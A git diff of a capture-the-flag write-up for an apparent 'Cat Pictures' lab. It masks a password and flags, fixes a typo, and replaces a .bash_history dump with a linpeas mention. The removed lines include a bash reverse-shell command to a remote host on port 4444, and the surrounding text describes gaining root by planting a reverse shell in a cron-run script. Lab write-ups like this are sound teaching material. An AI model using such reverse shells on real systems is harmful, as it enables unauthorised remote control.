@@ -82,7 +82,7 @@ We got a FTP server and inside it we got a note.txt . Let's see what was that
 ```
 In case I forget my password, I'm leaving a pointer to the internal shell service on the server.
 
-Connect to port 4420, the password is sardinethecat.
+Connect to port 4420, the password is *******.
 - catlover
 ```
 We got a password and port 4420. Let's look into port 4420
@@ -161,7 +161,7 @@ drwxr-xr-x 3 0 0  4096 Apr  2 20:51 ..
 When we look into that run me file we got some nonsence there. But among them my cat eyes caught this
 
 ```
-rbeccaPlease enter yout password: Welcome, catlover! SSH key transfer queued! touch /tmp/gibmethesshkeyAccess Deniedd
+rbeccaPlease enter your password: Welcome, catlover! SSH key transfer queued! touch /tmp/gibmethesshkeyAccess Deniedd
 ```
 Maybe rebecca is the password. who knows we can try it.
 
@@ -201,46 +201,13 @@ root@7546fa2336d6:/# cd root
 root@7546fa2336d6:/root# ls
 flag.txt
 root@7546fa2336d6:/root# cat flag.txt
+*******
 ```
-After some waste of time I take a look into the **.bash_history**. This suprised me lot !!
+After some waste of time I ran a linpeas script to make sure everything didn't miss. There was a “/opt/clean” filesystem that was exactly the same as “overlay”.
 
-```bash
-root@7546fa2336d6:/# cat .bash_history 
-exit
-exit
-ip a
-ifconfig
-apt install ifconfig
-ip
-exit
-nano /opt/clean/clean.sh 
-ping 192.168.4.20
-apt install ping
-apt update
-apt install ping
-apt install iptuils-ping
-apt install iputils-ping
-exit
-ls
-cat /opt/clean/clean.sh 
-nano /opt/clean/clean.sh 
-clear
-cat /etc/crontab
-ls -alt /
-cat /post-init.sh 
-cat /opt/clean/clean.sh 
-bash -i >&/dev/tcp/192.168.4.20/4444 <&1
-nano /opt/clean/clean.sh 
-nano /opt/clean/clean.sh 
-nano /opt/clean/clean.sh 
-nano /opt/clean/clean.sh 
-cat /var/log/dpkg.log 
-nano /opt/clean/clean.sh 
-nano /opt/clean/clean.sh 
-exit
-exit
-```
-Here we got some file call **clean.sh** on **opt** directory. Someone edit this file and take a look into the **crontab** . This must be our way into root. 
+![](Images/system-with-linpeas.png)
+
+When I went to the “/opt/clean” location, there was a “clean.sh” script in there. It cleaned the “/tmp” directory completely.
 
 Let's hope into the **opt** directory and try to execute a rev shell and setup a nc listener. This was my revshell :
 ```
@@ -262,5 +229,6 @@ root@cat-pictures:~# cat root.txt
 cat root.txt
 Congrats!!!
 Here is your flag:
+******
 ```
 Thx for reading !!
